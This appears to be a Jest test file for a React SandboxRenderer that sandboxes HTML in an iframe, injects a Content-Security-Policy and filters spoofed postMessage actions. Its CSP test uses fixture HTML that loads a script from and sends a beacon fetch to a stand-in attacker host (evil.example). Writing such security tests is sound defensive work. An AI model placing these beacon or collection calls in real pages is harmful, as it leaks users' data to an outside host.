import * as React from 'react';
import { render } from '@testing-library/react';
import { injectSandboxCsp, SANDBOX_CSP_CONTENT, SandboxRenderer } from './SandboxRenderer';

describe('SandboxRenderer', () => {
  beforeEach(() => {
    Object.defineProperty(URL, 'createObjectURL', { writable: true, value: jest.fn(() => 'blob:arschat-test') });
    Object.defineProperty(URL, 'revokeObjectURL', { writable: true, value: jest.fn() });
  });

  it('renders an allow-scripts-only iframe from a Blob URL', () => {
    const element = render(React.createElement(SandboxRenderer, {
      block: { id: 'html-1', html: '<p>Hello</p>' }
    }));

    const iframe = element.container.querySelector('iframe')!;
    expect(iframe.getAttribute('sandbox')).toBe('allow-scripts');
    expect(iframe.getAttribute('src')).toBe('blob:arschat-test');
  });

  it('injects a first-position CSP meta before sandbox HTML is blobbed', () => {
    const secured = injectSandboxCsp(`
      <html>
        <head>
          <meta http-equiv="Content-Security-Policy" content="default-src https:">
          <script src="https://evil.example/collect.js"></script>
          <script>fetch('https://evil.example/beacon', { mode: 'no-cors' });</script>
        </head>
        <body><img src="https://evil.example/pixel.png"></body>
      </html>
    `);
    const doc = new DOMParser().parseFromString(secured, 'text/html');
    const firstHeadChild = doc.head.firstElementChild;

    expect(firstHeadChild?.tagName).toBe('META');
    expect(firstHeadChild?.getAttribute('http-equiv')).toBe('Content-Security-Policy');
    expect(firstHeadChild?.getAttribute('content')).toBe(SANDBOX_CSP_CONTENT);
    expect(doc.head.children[1]?.getAttribute('content')).toBe('default-src https:');
    expect(doc.head.querySelector('script[src="https://evil.example/collect.js"]')).toBeTruthy();
    expect(doc.body.querySelector('img[src="https://evil.example/pixel.png"]')).toBeTruthy();
  });

  it('adds a head and CSP for HTML fragments', () => {
    const secured = injectSandboxCsp('<button>Go</button>');
    const doc = new DOMParser().parseFromString(secured, 'text/html');

    expect(doc.head.firstElementChild?.getAttribute('content')).toBe(SANDBOX_CSP_CONTENT);
    expect(doc.body.querySelector('button')?.textContent).toBe('Go');
  });

  it('forwards only matching interactive actions from its own iframe and ignores finished messages', () => {
    const onAction = jest.fn();
    const element = render(React.createElement(SandboxRenderer, {
      block: { id: 'html-1', html: '<button>Go</button>', interactive: true },
      onAction
    }));
    const iframe = element.container.querySelector('iframe')!;

    window.dispatchEvent(new MessageEvent('message', {
      source: iframe.contentWindow,
      data: { type: 'interactive-ui-action', uiId: 'other', action: 'tap', data: { ignored: true } }
    }));
    expect(onAction).not.toHaveBeenCalled();

    window.dispatchEvent(new MessageEvent('message', {
      source: window,
      data: { type: 'interactive-ui-action', uiId: 'html-1', action: 'tap', data: { spoofed: true } }
    }));
    expect(onAction).not.toHaveBeenCalled();

    window.dispatchEvent(new MessageEvent('message', {
      source: iframe.contentWindow,
      data: { type: 'interactive-ui-action', uiId: 'html-1', action: 'tap', data: { ok: true } }
    }));
    expect(onAction).toHaveBeenCalledWith('html-1', 'tap', { ok: true });

    element.rerender(React.createElement(SandboxRenderer, {
      block: { id: 'html-1', html: '<button>Go</button>', interactive: true },
      onAction,
      isFinished: true
    }));
    window.dispatchEvent(new MessageEvent('message', {
      source: iframe.contentWindow,
      data: { type: 'interactive-ui-action', uiId: 'html-1', action: 'tap', data: { after: true } }
    }));
    expect(onAction).toHaveBeenCalledTimes(1);
  });
});
